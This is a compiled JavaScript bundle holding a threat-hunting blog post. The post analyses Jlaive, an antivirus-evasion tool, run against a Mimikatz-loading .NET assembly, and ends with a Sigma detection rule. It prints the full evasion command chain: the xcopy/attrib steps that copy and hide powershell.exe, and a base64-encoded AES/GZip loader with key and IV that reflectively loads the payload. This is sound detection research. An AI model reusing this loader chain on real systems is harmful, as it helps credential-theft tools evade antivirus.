"use strict";(self.webpackChunkjstnk=self.webpackChunkjstnk||[]).push([[5415],{3905:function(e,t,n){n.d(t,{Zo:function(){return p},kt:function(){return u}});var i=n(7294);function a(e,t,n){return t in e?Object.defineProperty(e,t,{value:n,enumerable:!0,configurable:!0,writable:!0}):e[t]=n,e}function s(e,t){var n=Object.keys(e);if(Object.getOwnPropertySymbols){var i=Object.getOwnPropertySymbols(e);t&&(i=i.filter((function(t){return Object.getOwnPropertyDescriptor(e,t).enumerable}))),n.push.apply(n,i)}return n}function l(e){for(var t=1;t<arguments.length;t++){var n=null!=arguments[t]?arguments[t]:{};t%2?s(Object(n),!0).forEach((function(t){a(e,t,n[t])})):Object.getOwnPropertyDescriptors?Object.defineProperties(e,Object.getOwnPropertyDescriptors(n)):s(Object(n)).forEach((function(t){Object.defineProperty(e,t,Object.getOwnPropertyDescriptor(n,t))}))}return e}function o(e,t){if(null==e)return{};var n,i,a=function(e,t){if(null==e)return{};var n,i,a={},s=Object.keys(e);for(i=0;i<s.length;i++)n=s[i],t.indexOf(n)>=0||(a[n]=e[n]);return a}(e,t);if(Object.getOwnPropertySymbols){var s=Object.getOwnPropertySymbols(e);for(i=0;i<s.length;i++)n=s[i],t.indexOf(n)>=0||Object.prototype.propertyIsEnumerable.call(e,n)&&(a[n]=e[n])}return a}var r=i.createContext({}),c=function(e){var t=i.useContext(r),n=t;return e&&(n="function"==typeof e?e(t):l(l({},t),e)),n},p=function(e){var t=c(e.components);return i.createElement(r.Provider,{value:t},e.children)},m={inlineCode:"code",wrapper:function(e){var t=e.children;return i.createElement(i.Fragment,{},t)}},h=i.forwardRef((function(e,t){var n=e.components,a=e.mdxType,s=e.originalType,r=e.parentName,p=o(e,["components","mdxType","originalType","parentName"]),h=c(n),u=a,d=h["".concat(r,".").concat(u)]||h[u]||m[u]||s;return n?i.createElement(d,l(l({ref:t},p),{},{components:n})):i.createElement(d,l({ref:t},p))}));function u(e,t){var n=arguments,a=t&&t.mdxType;if("string"==typeof e||a){var s=n.length,l=new Array(s);l[0]=h;var o={};for(var r in t)hasOwnProperty.call(t,r)&&(o[r]=t[r]);o.originalType=e,o.mdxType="string"==typeof e?e:a,l[1]=o;for(var c=2;c<s;c++)l[c]=n[c];return i.createElement.apply(null,l)}return i.createElement.apply(null,n)}h.displayName="MDXCreateElement"},3184:function(e,t,n){n.r(t),n.d(t,{frontMatter:function(){return o},contentTitle:function(){return r},metadata:function(){return c},assets:function(){return p},toc:function(){return m},default:function(){return u}});var i=n(7462),a=n(3366),s=(n(7294),n(3905)),l=["components"],o={slug:"Jlaive-Antivirus-Evasion-Tool",title:"Using Jlaive to create batch files from .NET assemblies for defense evasion",authors:"joseliyo",tags:["threat hunting","detection","visibility","research",".NET"]},r=void 0,c={permalink:"/jstnk9/research/Jlaive-Antivirus-Evasion-Tool",source:"@site/research/2022-05-24-Jlaive-Antivirus-Evasion-Tool/2022-05-24-Jlaive-Antivirus-Evasion-Tool.md",title:"Using Jlaive to create batch files from .NET assemblies for defense evasion",description:"Summary",date:"2022-05-24T00:00:00.000Z",formattedDate:"May 24, 2022",tags:[{label:"threat hunting",permalink:"/jstnk9/research/tags/threat-hunting"},{label:"detection",permalink:"/jstnk9/research/tags/detection"},{label:"visibility",permalink:"/jstnk9/research/tags/visibility"},{label:"research",permalink:"/jstnk9/research/tags/research"},{label:".NET",permalink:"/jstnk9/research/tags/net"}],readingTime:6.245,truncated:!0,authors:[{name:"Jose Luis S\xe1nchez Mart\xednez",title:"Security Researcher",url:"https://twitter.com/Joseliyo_Jstnk",imageURL:"https://jstnk9.github.io/jstnk9/img/profiles/1574890680450.jpeg",key:"joseliyo"}],prevItem:{title:"Analyzing AsyncRAT distributed in Colombia by Blind Eagle",permalink:"/jstnk9/research/AsyncRAT-Analysis"},nextItem:{title:"Executing SCR files using desk.cpl and InstallScreenSaver API Call",permalink:"/jstnk9/research/InstallScreenSaver-SCR-files"}},p={authorsImageUrls:[void 0]},m=[{value:"Summary",id:"summary",children:[],level:2},{value:"Creating the batch file with Jlaive",id:"creating-the-batch-file-with-jlaive",children:[],level:2},{value:"Executing the assembly (Mimikatz batch file)",id:"executing-the-assembly-mimikatz-batch-file",children:[{value:"High level processes events",id:"high-level-processes-events",children:[],level:3},{value:"Genealogy",id:"genealogy",children:[],level:3},{value:"cmd.exe - 2980",id:"cmdexe---2980",children:[],level:3},{value:"cmd.exe - 9420",id:"cmdexe---9420",children:[],level:3},{value:"xcopy.exe - 10188",id:"xcopyexe---10188",children:[],level:3},{value:"attrib.exe - 3672",id:"attribexe---3672",children:[],level:3},{value:"KatzNetAssembly.bat.exe - 8576",id:"katznetassemblybatexe---8576",children:[],level:3},{value:"csc.exe - 5952",id:"cscexe---5952",children:[],level:3},{value:"cvtress.exe - 9520",id:"cvtressexe---9520",children:[],level:3}],level:2},{value:"Sigma rule",id:"sigma-rule",children:[],level:2}],h={toc:m};function u(e){var t=e.components,n=(0,a.Z)(e,l);return(0,s.kt)("wrapper",(0,i.Z)({},h,n,{components:t,mdxType:"MDXLayout"}),(0,s.kt)("h2",{id:"summary"},"Summary"),(0,s.kt)("p",null,"Jlaive is a project created to evade antivirus by creating batch files from .NET assemblies. The way it does it is very interesting and gives a new window of opportunities to actors to evade defenses and execute their payloads."),(0,s.kt)("p",null,"You can find the project on their official GitHub: ",(0,s.kt)("a",{parentName:"p",href:"https://github.com/ch2sh/Jlaive"},"https://github.com/ch2sh/Jlaive")),(0,s.kt)("h2",{id:"creating-the-batch-file-with-jlaive"},"Creating the batch file with Jlaive"),(0,s.kt)("p",null,"In order to test the operation and the different events generated by this tool on a system, batch files must first be generated. The project currently provides two ways to do this."),(0,s.kt)("ul",null,(0,s.kt)("li",{parentName:"ul"},"Using the CLI file: ",(0,s.kt)("a",{parentName:"li",href:"https://github.com/ch2sh/Jlaive/tree/main/Jlaive-CLI"},"Jlaive-CLI")),(0,s.kt)("li",{parentName:"ul"},"Using the GUI: ",(0,s.kt)("a",{parentName:"li",href:"https://github.com/ch2sh/Jlaive/tree/main/Jlaive"},"Jlaive"))),(0,s.kt)("p",null,"To test the behavior of the generated batch file, we are going to use an assembly from a known GitHub project that aims to load Mimikatz in memory through an injection."),(0,s.kt)("p",null,"The configuration used in Jlaive to create the batch file was as follows."),(0,s.kt)("p",null,(0,s.kt)("img",{parentName:"p",src:"https://jstnk9.github.io/jstnk9/img/research-Jlaive-Antivirus-Evasion-Tool/1-creatingbatch.png",alt:"configuration-jlaive"})),(0,s.kt)("h2",{id:"executing-the-assembly-mimikatz-batch-file"},"Executing the assembly (Mimikatz batch file)"),(0,s.kt)("p",null,"For this case, the .NET assembly used is KatzNetAssembly, which can be found in their GitHub ",(0,s.kt)("a",{parentName:"p",href:"https://github.com/med0x2e/NET-Assembly-Inject-Remote"},"https://github.com/med0x2e/NET-Assembly-Inject-Remote"),"."),(0,s.kt)("p",null,"When Jlaive is used to generate the batch file, the result is the expected .bat file. Looking at the contents of the .bat file in this case, we can see something like the following image."),(0,s.kt)("p",null,(0,s.kt)("img",{parentName:"p",src:"https://jstnk9.github.io/jstnk9/img/research-Jlaive-Antivirus-Evasion-Tool/2-codemimikatz.jpg",alt:"codemimi"})),(0,s.kt)("p",null,"As a test, I uploaded to VirusTotal both the original KatzNetAssembly binary and the generated batch file to check that vendors detected both as malicious, since Mimikatz is considered malicious by the vast majority of vendors."),(0,s.kt)("p",null,"First, the KatzNetAssembly binary was detected by 43 different engines."),(0,s.kt)("p",null,(0,s.kt)("img",{parentName:"p",src:"https://jstnk9.github.io/jstnk9/img/research-Jlaive-Antivirus-Evasion-Tool/3-katznetassemblyVT.jpg",alt:"katz_vt"})),(0,s.kt)("p",null,"In contrast, the batch file generated above was not detected by any of them."),(0,s.kt)("p",null,(0,s.kt)("img",{parentName:"p",src:"https://jstnk9.github.io/jstnk9/img/research-Jlaive-Antivirus-Evasion-Tool/4-katznetassemblybatchVT.jpg",alt:"katzbatch_vt"})),(0,s.kt)("p",null,"As soon as the .bat file is executed, you can see how Mimikatz is loaded for use by the user."),(0,s.kt)("p",null,(0,s.kt)("img",{parentName:"p",src:"https://jstnk9.github.io/jstnk9/img/research-Jlaive-Antivirus-Evasion-Tool/5-mimirunning.png",alt:"Mimikatzrunning"})),(0,s.kt)("h3",{id:"high-level-processes-events"},"High level processes events"),(0,s.kt)("p",null,"When the batch file is executed, different events take place in the operating system, ranging from the creation of temporary files to be used (for compilation purposes) to the copying of the legitimate powershell binary. The following image is a high-level visualization of the events that occur in the operating system.  "),(0,s.kt)("p",null,(0,s.kt)("img",{parentName:"p",src:"https://jstnk9.github.io/jstnk9/img/research-Jlaive-Antivirus-Evasion-Tool/procdot_1.png",alt:"processes_events"})),(0,s.kt)("p",null,"The quality of the image is not the best (procdot pls :D), but it is useful to see at a high level all the events that happen related to files, processes, threads, registry keys, etc. In the following sections we will go in detail in the most important events of the previous image."),(0,s.kt)("h3",{id:"genealogy"},"Genealogy"),(0,s.kt)("p",null,"Taking a look at the process genealogy generated after the execution, we can see the following activity that took place when we executed the batch file:"),(0,s.kt)("p",null,(0,s.kt)("img",{parentName:"p",src:"https://jstnk9.github.io/jstnk9/img/research-Jlaive-Antivirus-Evasion-Tool/6-genologyprocessmimikatz.png",alt:"genealogy"})),(0,s.kt)("p",null,"From top to bottom, the processes with their corresponding command lines that are launched during execution are as follows."),(0,s.kt)("h3",{id:"cmdexe---2980"},"cmd.exe - 2980"),(0,s.kt)("pre",null,(0,s.kt)("code",{parentName:"pre"},'C:\\Windows\\system32\\cmd.exe /c ""C:\\Users\\lab\\Desktop\\mimi\\NET-Assembly-Inject-Remote-master\\KatzNetAssembly\\bin\\Debug\\KatzNetAssembly.bat" "\n')),(0,s.kt)("p",null,"This is the initial execution of the batch file. From this point on, the auto-generated batch file performs different actions on the system when it is executed."),(0,s.kt)("h3",{id:"cmdexe---9420"},"cmd.exe - 9420"),(0,s.kt)("pre",null,(0,s.kt)("code",{parentName:"pre"},'C:\\Windows\\system32\\cmd.exe  /S /D /c" echo F"\n')),(0,s.kt)("p",null,"This process does not perform any particular action. This is because in the first lines of the batch file the following information can be observed."),(0,s.kt)("p",null,(0,s.kt)("img",{parentName:"p",src:"https://jstnk9.github.io/jstnk9/img/research-Jlaive-Antivirus-Evasion-Tool/7-twocmm.png",alt:"twocommands"})),(0,s.kt)("p",null,"Line 2 of the previous image shows how the ",(0,s.kt)("inlineCode",{parentName:"p"},"|")," character exists without being escaped by ",(0,s.kt)("inlineCode",{parentName:"p"},"^"),". Therefore, the first part before the ",(0,s.kt)("inlineCode",{parentName:"p"},"|")," character will be launched as a new process that will simply do a ",(0,s.kt)("inlineCode",{parentName:"p"},"echo F")," (this same cmd.exe process with PID 9420), and the second part after the ",(0,s.kt)("inlineCode",{parentName:"p"},"|")," character will be the execution of a new process called by ",(0,s.kt)("inlineCode",{parentName:"p"},"xcopy.exe"),", which we will see its purpose below."),(0,s.kt)("h3",{id:"xcopyexe---10188"},"xcopy.exe - 10188"),(0,s.kt)("pre",null,(0,s.kt)("code",{parentName:"pre"},'xcopy  C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe "C:\\Users\\lab\\Desktop\\mimi\\NET-Assembly-Inject-Remote-master\\KatzNetAssembly\\bin\\Debug\\KatzNetAssembly.bat.exe" /y\n')),(0,s.kt)("p",null,"Xcopy is a Microsoft Windows binary that can be used to copy files and directories. In this case, the copy that is made is ",(0,s.kt)("inlineCode",{parentName:"p"},"powershell.exe")," with the same name as the initial batch file, leaving finally in this case the name ",(0,s.kt)("inlineCode",{parentName:"p"},"KatzNetAssembly.bat.exe"),"."),(0,s.kt)("p",null,(0,s.kt)("img",{parentName:"p",src:"https://jstnk9.github.io/jstnk9/img/research-Jlaive-Antivirus-Evasion-Tool/8-createdfileswrite.jpg",alt:"writefilesxcopy"})),(0,s.kt)("h3",{id:"attribexe---3672"},"attrib.exe - 3672"),(0,s.kt)("pre",null,(0,s.kt)("code",{parentName:"pre"},'attrib  +s +h "C:\\Users\\lab\\Desktop\\mimi\\NET-Assembly-Inject-Remote-master\\KatzNetAssembly\\bin\\Debug\\KatzNetAssembly.bat.exe"\n')),(0,s.kt)("p",null,(0,s.kt)("inlineCode",{parentName:"p"},"attrib")," is another Microsoft Windows utility. It is used in this case to set attributes assigned to the newly copied file."),(0,s.kt)("ul",null,(0,s.kt)("li",{parentName:"ul"},"+s: Sets the System file attribute. "),(0,s.kt)("li",{parentName:"ul"},"+h: Sets the Hidden file attribute.")),(0,s.kt)("h3",{id:"katznetassemblybatexe---8576"},"KatzNetAssembly.bat.exe - 8576"),(0,s.kt)("pre",null,(0,s.kt)("code",{parentName:"pre"},"KatzNetAssembly.bat.exe  -noprofile  -executionpolicy bypass -command $FlOctL = [System.IO.File]::ReadAllText('C:\\Users\\lab\\Desktop\\mimi\\NET-Assembly-Inject-Remote-master\\KatzNetAssembly\\bin\\Debug\\KatzNetAssembly.bat').Split([Environment]::NewLine);$hUtefJ = $FlOctL[$FlOctL.Length - 1];$kADuSQ = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('dXNpbmcgU3lzdGVtLlRleHQ7dXNpbmcgU3lzdGVtLklPO3VzaW5nIFN5c3RlbS5JTy5Db21wcmVzc2lvbjt1c2luZyBTeXN0ZW0uU2VjdXJpdHkuQ3J5cHRvZ3JhcGh5OyBwdWJsaWMgY2xhc3Mgc2t2Z1pSIHsgcHVibGljIHN0YXRpYyBieXRlW10geVhMZVdlKGJ5dGVbXSBpbnB1dCwgYnl0ZVtdIGtleSwgYnl0ZVtdIGl2KSB7IEFlc01hbmFnZWQgYWVzID0gbmV3IEFlc01hbmFnZWQoKTsgYWVzLk1vZGUgPSBDaXBoZXJNb2RlLkNCQzsgYWVzLlBhZGRpbmcgPSBQYWRkaW5nTW9kZS5QS0NTNzsgSUNyeXB0b1RyYW5zZm9ybSBkZWNyeXB0b3IgPSBhZXMuQ3JlYXRlRGVjcnlwdG9yKGtleSwgaXYpOyBieXRlW10gZGVjcnlwdGVkID0gZGVjcnlwdG9yLlRyYW5zZm9ybUZpbmFsQmxvY2soaW5wdXQsIDAsIGlucHV0Lkxlbmd0aCk7IGRlY3J5cHRvci5EaXNwb3NlKCk7IGFlcy5EaXNwb3NlKCk7IHJldHVybiBkZWNyeXB0ZWQ7IH0gcHVibGljIHN0YXRpYyBieXRlW10geFpQcEdaKGJ5dGVbXSBieXRlcykgeyBNZW1vcnlTdHJlYW0gbXNpID0gbmV3IE1lbW9yeVN0cmVhbShieXRlcyk7IE1lbW9yeVN0cmVhbSBtc28gPSBuZXcgTWVtb3J5U3RyZWFtKCk7IHZhciBncyA9IG5ldyBHWmlwU3RyZWFtKG1zaSwgQ29tcHJlc3Npb25Nb2RlLkRlY29tcHJlc3MpOyBncy5Db3B5VG8obXNvKTsgZ3MuRGlzcG9zZSgpOyBtc2kuRGlzcG9zZSgpOyBtc28uRGlzcG9zZSgpOyByZXR1cm4gbXNvLlRvQXJyYXkoKTsgfSB9'));Add-Type -TypeDefinition $kADuSQ;[System.Reflection.Assembly]::Load([skvgZR]::xZPpGZ([skvgZR]::yXLeWe([System.Convert]::FromBase64String($hUtefJ), [System.Convert]::FromBase64String('NWgsuaovf9gO9aKy86zcaVaagsVYYBrngI5j7GXrTW8='), [System.Convert]::FromBase64String('oEMFGnnW7fwO+yXIvucIbA==')))).EntryPoint.Invoke($null, (, [string[]] ('')))\n")),(0,s.kt)("p",null,"The ",(0,s.kt)("inlineCode",{parentName:"p"},"KatzNetAssembly.bat.exe")," file is actually ",(0,s.kt)("inlineCode",{parentName:"p"},"PowerShell.exe"),", which in this case is executed through a series of parameters and a command through ",(0,s.kt)("inlineCode",{parentName:"p"},"-command"),", where it first reads the batch file information and then loads the assembly in memory to run Mimikatz."),(0,s.kt)("p",null,"This is achieved by the ",(0,s.kt)("inlineCode",{parentName:"p"},"Add-Type")," cmdlet which adds the .NET class to the ",(0,s.kt)("inlineCode",{parentName:"p"},"PowerShell")," session and with the help of ",(0,s.kt)("inlineCode",{parentName:"p"},"System.Reflection.Assembly::Load")," the payload is loaded into memory. "),(0,s.kt)("p",null,"When these processes are executed to perform such compilations, it is important to know that there are a series of temporary files that are generated in the system. In this case, we will focus a little more on the files named ",(0,s.kt)("inlineCode",{parentName:"p"},"wzpaloqi.0.cs")," and ",(0,s.kt)("inlineCode",{parentName:"p"},"wzpaloqi.cmdline"),". The latter will be used later by ",(0,s.kt)("inlineCode",{parentName:"p"},"csc.exe")," which contains addresses to compile the code."),(0,s.kt)("p",null,(0,s.kt)("img",{parentName:"p",src:"https://jstnk9.github.io/jstnk9/img/research-Jlaive-Antivirus-Evasion-Tool/9-tmpfiles.jpg",alt:"tmpfiles"})),(0,s.kt)("p",null,"Subsequently, it also removes these files from the system."),(0,s.kt)("p",null,(0,s.kt)("img",{parentName:"p",src:"https://jstnk9.github.io/jstnk9/img/research-Jlaive-Antivirus-Evasion-Tool/9-tmpfilesdelete.jpg",alt:"tmpfilesdeleted"})),(0,s.kt)("h3",{id:"cscexe---5952"},"csc.exe - 5952"),(0,s.kt)("pre",null,(0,s.kt)("code",{parentName:"pre"},'"C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\csc.exe" /noconfig /fullpaths @"C:\\Users\\lab\\AppData\\Local\\Temp\\wzpaloqi.cmdline"\n')),(0,s.kt)("p",null,"Due to the above execution to load the assembly into memory, ",(0,s.kt)("inlineCode",{parentName:"p"},"csc.exe")," is launched to perform the compilation (",(0,s.kt)("inlineCode",{parentName:"p"},"csc.exe")," is used by .NET to compile C# code). "),(0,s.kt)("p",null,"As stated above, the ",(0,s.kt)("inlineCode",{parentName:"p"},"wzpaloqi.cmdline")," file that is passed as a parameter to ",(0,s.kt)("inlineCode",{parentName:"p"},"csc.exe")," contains the addresses to compile the code. In this case, the contents are as follows"),(0,s.kt)("pre",null,(0,s.kt)("code",{parentName:"pre"},'/t:library /utf8output /R:"System.dll" /R:"C:\\Windows\\assembly\\GAC_MSIL\\System.Management.Automation\\1.0.0.0__31bf3856ad364e35\\System.Management.Automation.dll" /out:"C:\\Users\\lab\\AppData\\Local\\Temp\\wzpaloqi.dll" /D:DEBUG /debug+ /optimize- /warnaserror  "C:\\Users\\lab\\AppData\\Local\\Temp\\wzpaloqi.0.cs"\n')),(0,s.kt)("p",null,"Note the use of the ",(0,s.kt)("inlineCode",{parentName:"p"},"/t")," parameter to generate a ",(0,s.kt)("inlineCode",{parentName:"p"},"Library")," TargetType. Also the references to the ",(0,s.kt)("inlineCode",{parentName:"p"},"System.dll")," and ",(0,s.kt)("inlineCode",{parentName:"p"},"System.Management.Automation.dll")," (Powershelll) DLLs. Finally, the output file to ",(0,s.kt)("inlineCode",{parentName:"p"},"wzpaloqi.dll"),"."),(0,s.kt)("p",null,(0,s.kt)("img",{parentName:"p",src:"https://jstnk9.github.io/jstnk9/img/research-Jlaive-Antivirus-Evasion-Tool/10-dllcreated.jpg",alt:"tmpfilesdeleted"})),(0,s.kt)("p",null,"The ",(0,s.kt)("inlineCode",{parentName:"p"},"wzpaloqi.0.cs")," file contains the definition of the class that was previously used by the ",(0,s.kt)("inlineCode",{parentName:"p"},"Add-Type")," cmdlet in the ",(0,s.kt)("inlineCode",{parentName:"p"},"PowerShell")," execution. The content of this C# file would look like the following."),(0,s.kt)("pre",null,(0,s.kt)("code",{parentName:"pre",className:"language-c"},"using System.Text;\nusing System.IO;\nusing System.IO.Compression;\nusing System.Security.Cryptography;\npublic class sIRAVQ {\n  public static byte[] agudvC(byte[] input, byte[] key, byte[] iv) {\n    AesManaged aes = new AesManaged();\n    aes.Mode = CipherMode.CBC;\n    aes.Padding = PaddingMode.PKCS7;\n    ICryptoTransform decryptor = aes.CreateDecryptor(key, iv);\n    byte[] decrypted = decryptor.TransformFinalBlock(input, 0, input.Length);\n    decryptor.Dispose();\n    aes.Dispose();\n    return decrypted;\n  }\n  public static byte[] WpDGoD(byte[] bytes) {\n    MemoryStream msi = new MemoryStream(bytes);\n    MemoryStream mso = new MemoryStream();\n    var gs = new GZipStream(msi, CompressionMode.Decompress);\n    gs.CopyTo(mso);\n    gs.Dispose();\n    msi.Dispose();\n    mso.Dispose();\n    return mso.ToArray();\n  }\n}\n")),(0,s.kt)("h3",{id:"cvtressexe---9520"},"cvtress.exe - 9520"),(0,s.kt)("pre",null,(0,s.kt)("code",{parentName:"pre"},'C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\cvtres.exe /NOLOGO /READONLY /MACHINE:IX86 "/OUT:C:\\Users\\lab\\AppData\\Local\\Temp\\RES7B30.tmp" "c:\\Users\\lab\\AppData\\Local\\Temp\\CSC73E174637C7249A1B3624F5536864A1.TMP"\n')),(0,s.kt)("p",null,"The purpose of ",(0,s.kt)("inlineCode",{parentName:"p"},"cvtress.exe")," is to convert resources to objects at compile time. These objects will eventually be the ones linked into the final .exe."),(0,s.kt)("h2",{id:"sigma-rule"},"Sigma rule"),(0,s.kt)("p",null,"The behavior of this project is very characteristic, which can help us to create detection rules. For this reason, the following sigma rule can help us to detect these behaviors in our systems."),(0,s.kt)("p",null,"Link to sigma rule: ",(0,s.kt)("a",{parentName:"p",href:"https://github.com/SigmaHQ/sigma/blob/master/rules/windows/process_creation/proc_creation_win_jlaive_batch_execution.yml"},"https://github.com/SigmaHQ/sigma/blob/master/rules/windows/process_creation/proc_creation_win_jlaive_batch_execution.yml")),(0,s.kt)("pre",null,(0,s.kt)("code",{parentName:"pre",className:"language-yml"},"title: Jlaive Usage For Assembly Execution In-Memory\nid: 0a99eb3e-1617-41bd-b095-13dc767f3def\ndescription: Detect the use of Jlaive to execute assemblies in a copied PowerShell \nstatus: experimental\ndate: 2022/05/24\nmodified: 2022/05/24\nauthor: Jose Luis Sanchez Martinez (@Joseliyo_Jstnk)\nreferences:\n    - https://twitter.com/VakninHai/status/1517027824984547329\n    - https://github.com/ch2sh/Jlaive\nlogsource:\n  product: windows\n  category: process_creation\ndetection:\n  parent_selection:\n    ParentImage|endswith: '\\cmd.exe'\n    ParentCommandLine|endswith: '.bat'\n  selection1:\n    Image|endswith: '\\xcopy.exe'\n    CommandLine|contains|all:\n      - 'powershell.exe'\n      - '.bat.exe'\n  selection2:\n    Image|endswith: '\\attrib.exe'\n    CommandLine|contains|all:\n      - '+s'\n      - '+h'\n      - '.bat.exe'\n  condition: parent_selection and (1 of selection*)\nfalsepositives:\n    - Unknown\nlevel: medium\ntags:\n    - attack.execution\n    - attack.t1059.003\n")),(0,s.kt)("h2",null," Contact "),(0,s.kt)("p",null,(0,s.kt)("strong",{parentName:"p"},"Twitter"),": ",(0,s.kt)("a",{parentName:"p",href:"https://twitter.com/Joseliyo_Jstnk"},"https://twitter.com/Joseliyo_Jstnk")),(0,s.kt)("p",null,(0,s.kt)("strong",{parentName:"p"},"LinkedIn"),": ",(0,s.kt)("a",{parentName:"p",href:"https://www.linkedin.com/in/joseluissm/"},"https://www.linkedin.com/in/joseluissm/")))}u.isMDXComponent=!0}}]);